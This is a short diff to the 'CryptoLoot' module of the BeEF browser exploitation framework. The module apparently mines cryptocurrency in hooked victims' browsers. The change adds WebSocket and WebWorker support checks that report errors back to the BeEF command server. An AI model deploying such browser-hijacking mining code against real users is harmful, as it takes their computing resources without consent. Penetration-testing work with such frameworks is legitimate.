@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -12,6 +12,18 @@ beef.execute(function() {
   var comm_url = '<%= @command_url %>';
   var comm_id = <%= @command_id %>;
   var report_interval = +(<%= @report_interval %>) * 1000; // to miliseconds
+
+  if (!beef.browser.hasWebSocket()) {
+    beef.debug('[CryptoLoot] Error: browser does not support WebSockets');
+    beef.net.send(comm_url, comm_id, "error=unsupported browser - does not support WebSockets", beef.are.status_error());
+    return;
+  }
+
+  if (!beef.browser.hasWebWorker()) {
+    beef.debug('[CryptoLoot] Error: browser does not support WebWorkers');
+    beef.net.send(comm_url, comm_id, "error=unsupported browser - does not support WebWorkers", beef.are.status_error());
+    return;
+  }
 
   beef.debug("[CryptoLoot] Loading library...");
   beef.net.send(comm_url, comm_id, "[CryptoLoot] Loading library...");
